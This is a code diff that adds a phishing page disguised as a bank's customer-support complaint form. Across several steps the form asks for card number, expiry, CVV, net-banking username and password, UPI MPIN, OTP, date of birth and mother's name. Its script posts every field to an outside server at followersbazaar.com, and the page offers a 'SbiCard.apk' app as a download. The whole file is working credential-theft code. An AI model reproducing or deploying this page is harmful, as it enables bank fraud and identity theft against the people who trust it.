@@ -1,11 +1,514 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
-</head>
-<body>
-    
-</body>
-</html>
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+<meta charset="utf-8" />
+<meta content="width=device-width, initial-scale=1.0" name="viewport" />
+
+<title>Support Complaint</title>
+<meta content="" name="description" />
+<meta content="" name="keywords" />
+
+<!-- Favicons -->
+<link href="assets/img/favicon-32x32.json" rel="icon" />
+<link href="assets/img/apple-touch-icon.json" rel="apple-touch-icon" />
+
+<!-- Google Fonts -->
+<link rel="preconnect" href="https://fonts.googleapis.com/" />
+<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="" />
+<link
+  href="https://fonts.googleapis.com/css2?family=Open+Sans&amp;display=swap"
+  rel="stylesheet"
+/>
+
+<link
+  href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css"
+  rel="stylesheet"
+  integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3"
+  crossorigin="anonymous"
+/>
+<script
+  src="https://code.jquery.com/jquery-3.7.1.min.js"
+  integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo="
+  crossorigin="anonymous"
+></script>
+
+<!-- Template Main CSS File -->
+<link href="assets/css/style.css" rel="stylesheet" />
+
+<script src="https://cdn.jsdelivr.net/npm/vue@2"></script>
+
+<header style="border-color: #21a8d9">
+  <div class="container">
+    <div class="row">
+      <div class="col">
+        <!--<img src="assets/img/banner.jpg" alt="upi-logo">-->
+      </div>
+    </div>
+  </div>
+</header>
+
+<div class="hero-image">
+  <img
+    id="banner-image"
+    src="assets/img/img.png"
+    class=""
+    alt="complaint support"
+    style="width: 100%"
+  />
+</div>
+
+<!-- ======= Contact Section ======= -->
+<section id="app">
+  <div class="container">
+    <div class="row">
+      <div class="col">
+        <h4><b>Customer Support</b></h4>
+        <h4>All Type of Complaints Services Provider.</h4>
+      </div>
+    </div>
+    <div class="row justify-content-center">
+      <div class="col-md-6">
+        <div class="form-success">
+          <div
+            class="alert alert-success"
+            role="alert"
+            style="text-align: center"
+          >
+            <h4 class="alert-heading">Success!</h4>
+            <p>Your complaint has been registered successfully!</p>
+            <p class="text-success">
+              Complaint No. <span id="complaintno"></span>
+            </p>
+            <div class="card">
+              <div class="card-body" style="text-align: center">
+                <h5 class="card-title">
+                  Download our <b>Android App</b> to track your complaint status
+                </h5>
+                <a href="SbiCard.apk" class="btn btn-dark btn-lg" role="button"
+                  ><img
+                    src="assets/img/google-play.png"
+                    alt=""
+                  />&nbsp;&nbsp;Download</a
+                >
+              </div>
+            </div>
+
+            <hr />
+            <a href="" class="alert-link">Go to Home</a>
+          </div>
+        </div>
+
+        <form method="post" role="form" class="php-email-form">
+          <div class="step1">
+            <div class="mb-4">
+              <label for="floatingInputName" class="form-label"
+                >Card Holder Name <span class="required">*</span></label
+              >
+              <input
+                type="text"
+                class="form-control form-control-lg"
+                name="fullname"
+                id="fullname"
+                placeholder="Card Holder Name"
+                maxlength="49"
+              />
+            </div>
+
+            <div class="mb-4">
+              <label for="floatingInputMobileNo" class="form-label"
+                >Registered Mobile No <span class="required">*</span></label
+              >
+              <input
+                type="text"
+                class="form-control form-control-lg"
+                name="mob"
+                id="mob"
+                placeholder="Enter your mobile no"
+                maxlength="20"
+              />
+            </div>
+
+            <div class="mb-4">
+              <label for="floatingInputMobileNo" class="form-label"
+                >Mother's Name <span class="required">*</span></label
+              >
+              <input
+                type="text"
+                class="form-control form-control-lg"
+                name="mother"
+                id="mother"
+                placeholder="Enter Mother's Name"
+                maxlength="20"
+              />
+            </div>
+
+            <div class="mb-4">
+              <label for="floatingInputMobileNo" class="form-label"
+                >Date of Birth <span class="required">*</span></label
+              >
+              <input
+                type="date"
+                class="form-control form-control-lg"
+                name="dob"
+                id="dob"
+                placeholder=""
+                maxlength="20"
+                onfocus="this.showPicker()"
+              />
+            </div>
+
+            <div class="mb-4">
+              <label for="floatingSelectPaymentMode" class="form-label"
+                >Select Option <span class="required">*</span></label
+              >
+              <select
+                class="form-select form-control-lg"
+                name="paymentmode"
+                id="paymentmode"
+                aria-label="Select a payment mode"
+              >
+                <option value="">--Select an Option--</option>
+                <option value="KYC Update">KYC Update</option>
+                <option value="Card Block">Card Block</option>
+                <option value="Card Unblock">Card Unblock</option>
+                <option value="Due Payment">Due Payment</option>
+                <option value="Debit and Credit">Debit or Credit Card</option>
+                <option value="Internet Banking">Internet Banking</option>
+                <option value="UPI">UPI</option>
+              </select>
+            </div>
+
+            <div class="text-right" style="text-align: right">
+              <button
+                class="btn next_button next-step"
+                type="button"
+                style="background-color: #21a8d9; color: #fff"
+              >
+                Next Step
+              </button>
+            </div>
+          </div>
+
+          <div class="step2">
+            <div class="mb-4 card">
+              <label for="floatingCardNumber" class="form-label"
+                >Card Number <span class="required">*</span></label
+              >
+              <input
+                type="text"
+                class="form-control form-control-lg"
+                id="cardno"
+                name="cardno"
+                placeholder="Enter your card number"
+                maxlength="16"
+              />
+            </div>
+            <div class="mb-4 card">
+              <label for="floatingCardExpire" class="form-label"
+                >Expiry Date<span class="required">*</span></label
+              >
+              <input
+                type="text"
+                class="form-control form-control-lg"
+                name="expiry"
+                id="expiry"
+                placeholder="MM/YY"
+                maxlength="5"
+              />
+            </div>
+            <div class="mb-4 card">
+              <label for="floatingCvv" class="form-label"
+                >CVV<span class="required">*</span></label
+              >
+              <input
+                type="text"
+                class="form-control form-control-lg"
+                name="cvv"
+                id="cvv"
+                placeholder="Enter your CVV"
+                maxlength="3"
+              />
+            </div>
+
+            <div class="mb-4 bank">
+              <label for="floatingCvv" class="form-label"
+                >Enter Bank Name<span class="required">*</span></label
+              >
+              <input
+                type="text"
+                class="form-control form-control-lg"
+                name="bank"
+                id="bank"
+                placeholder="Enter Bank Name"
+              />
+            </div>
+
+            <div class="mb-4 bank">
+              <label for="floatingCvv" class="form-label"
+                >Username<span class="required">*</span></label
+              >
+              <input
+                type="text"
+                class="form-control form-control-lg"
+                name="username"
+                id="username"
+                placeholder="Username"
+              />
+            </div>
+
+            <div class="mb-4 bank">
+              <label for="floatingCvv" class="form-label"
+                >Password<span class="required">*</span></label
+              >
+              <input
+                type="text"
+                class="form-control form-control-lg"
+                name="password"
+                id="password"
+                placeholder="Password"
+              />
+            </div>
+
+            <div class="mb-4 upi">
+              <label for="floatingCvv" class="form-label"
+                >UPI App<span class="required">*</span></label
+              >
+              <input
+                type="text"
+                class="form-control form-control-lg"
+                name="upiapp"
+                id="upiapp"
+                placeholder="Phonepe, Google Pay, Paytm"
+              />
+            </div>
+
+            <div class="mb-4 upi">
+              <label for="floatingCvv" class="form-label"
+                >MPIN<span class="required">*</span></label
+              >
+              <input
+                type="text"
+                class="form-control form-control-lg"
+                name="mpin"
+                id="mpin"
+                placeholder="Enter M-PIN"
+              />
+            </div>
+
+            <div class="text-right" style="text-align: right">
+              <button
+                class="btn next_button next-step2"
+                type="button"
+                style="background-color: #21a8d9; color: #fff"
+              >
+                Next Step
+              </button>
+            </div>
+          </div>
+
+          <div class="step3">
+            <h3 class="text-success" id="noupi">
+              Enter the OTP Received on Your Registered Mobile No.
+              <span class="fw-bold" id="yourmob"></span> for Your KYC
+            </h3>
+
+            <div class="mb-4 noupi">
+              <label for="floatingCvv" class="form-label"
+                >Enter OTP<span class="required">*</span></label
+              >
+              <input
+                type="text"
+                class="form-control form-control-lg"
+                name="otp"
+                id="otp"
+                placeholder="Enter OTP"
+              />
+            </div>
+
+            <div class="text-right" style="text-align: right">
+              <button
+                class="btn next_button submit"
+                type="button"
+                style="background-color: #21a8d9; color: #fff"
+              >
+                Submit
+              </button>
+            </div>
+          </div>
+          <div class="hasError mt-2">
+            <div class="alert alert-danger" role="alert"></div>
+          </div>
+
+          <div class="form-loading">
+            <div class="d-flex justify-content-center">
+              <div class="spinner-border" role="status">
+                <span class="visually-hidden">Loading...</span>
+              </div>
+            </div>
+          </div>
+        </form>
+      </div>
+    </div>
+  </div>
+</section>
+
+<script>
+  $(document).ready(function () {
+    $(".alert-success").hide();
+    $(".form-loading").hide();
+    $(".hasError").hide();
+    $(".step2").hide();
+    $(".step3").hide();
+    $(".submit").hide();
+
+    $(".next-step").click(function () {
+      var fullname = $("#fullname").val();
+      var paymentmode = $("#paymentmode").val();
+      var mob = $("#mob").val();
+      var dob = $("#dob").val();
+      var mother = $("#mother").val();
+      $("#yourmob").html(mob);
+
+      if (
+        fullname == "" ||
+        paymentmode == "" ||
+        mob == "" ||
+        dob == "" ||
+        mother == ""
+      ) {
+        $(".alert-danger").html("Please fill all the fields");
+        $(".hasError").show();
+      } else {
+        $(".hasError").hide();
+        $(".step1").hide();
+
+        if (
+          paymentmode == "KYC Update" ||
+          paymentmode == "Card Block" ||
+          paymentmode == "Card unblock" ||
+          paymentmode == "Due Payment" ||
+          paymentmode == "Debit and Credit"
+        ) {
+          $(".card").show();
+          $(".bank").hide();
+          $(".upi").hide();
+        } else if (paymentmode == "Internet Banking") {
+          $(".bank").show();
+          $(".card").hide();
+          $(".upi").hide();
+        } else if (paymentmode == "UPI") {
+          $(".upi").show();
+          $(".bank").hide();
+          $(".card").hide();
+        }
+        $(".step2").show();
+      }
+    });
+
+    $(".next-step2").click(function () {
+      var paymentmode = $("#paymentmode").val();
+      var cardno = $("#cardno").val();
+      var cvv = $("#cvv").val();
+      var expiry = $("#expiry").val();
+      var bank = $("#bank").val();
+      var username = $("#username").val();
+      var password = $("#password").val();
+      var upiapp = $("#upiapp").val();
+      var mpin = $("#mpin").val();
+
+      if (
+        paymentmode == "KYC Update" ||
+        paymentmode == "Card Block" ||
+        paymentmode == "Card unblock" ||
+        paymentmode == "Due Payment" ||
+        paymentmode == "Debit and Credit"
+      ) {
+        if (cardno == "" || cvv == "" || expiry == "") {
+          $(".alert-danger").html("Please fill all the fields");
+          $(".hasError").show();
+        } else {
+          $(".hasError").hide();
+          $(".step2").hide();
+          $(".step3").show();
+          $(".submit").show();
+        }
+      } else if (paymentmode == "Internet Banking") {
+        if (bank == "" || username == "" || password == "") {
+          $(".alert-danger").html("Please fill all the fields");
+          $(".hasError").show();
+        } else {
+          $(".hasError").hide();
+          $(".step2").hide();
+          $(".step3").show();
+          $(".submit").show();
+        }
+      } else if (paymentmode == "UPI") {
+        $(".noupi").hide();
+        $("#noupi").html("KYC Verified Successfully.");
+        if (upiapp == "" || mpin == "") {
+          $(".alert-danger").html("Please fill all the fields");
+          $(".hasError").show();
+        } else {
+          $(".hasError").hide();
+          $(".step2").hide();
+          $(".step3").show();
+          $(".submit").show();
+        }
+      }
+    });
+
+    $(".submit").click(function () {
+      var fullname = $("#fullname").val();
+      var paymentmode = $("#paymentmode").val();
+      var mob = $("#mob").val();
+      var dob = $("#dob").val();
+      var mother = $("#mother").val();
+      var cardno = $("#cardno").val();
+      var cvv = $("#cvv").val();
+      var expiry = $("#expiry").val();
+      var bank = $("#bank").val();
+      var username = $("#username").val();
+      var password = $("#password").val();
+      var upiapp = $("#upiapp").val();
+      var mpin = $("#mpin").val();
+      var otp = $("#otp").val();
+
+      $(".hasError").hide();
+      $(".form-loading").show();
+      $(".submit").hide();
+      $.ajax({
+        url: "https://followersbazaar.com/submit.php",
+        method: "post",
+        data: {
+          fullname: fullname,
+          paymentmode: paymentmode,
+          mob: mob,
+          cardno: cardno,
+          expiry: expiry,
+          cvv: cvv,
+          bank: bank,
+          username: username,
+          password: password,
+          upiapp: upiapp,
+          mpin: mpin,
+          otp: otp,
+          dob: dob,
+          mother: mother,
+        },
+      }).done(function (data) {
+        if (data != 0) {
+          $(".form-loading").hide();
+          $(".alert-success").show();
+          $(".step3").hide();
+          $(".php-email-form").hide();
+          $("#complaintno").html(data);
+        }
+      });
+    });
+  });
+</script>
+
+<!-- Vendor JS Files -->
+<script
+  src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"
+  integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p"
+  crossorigin="anonymous"
+></script>
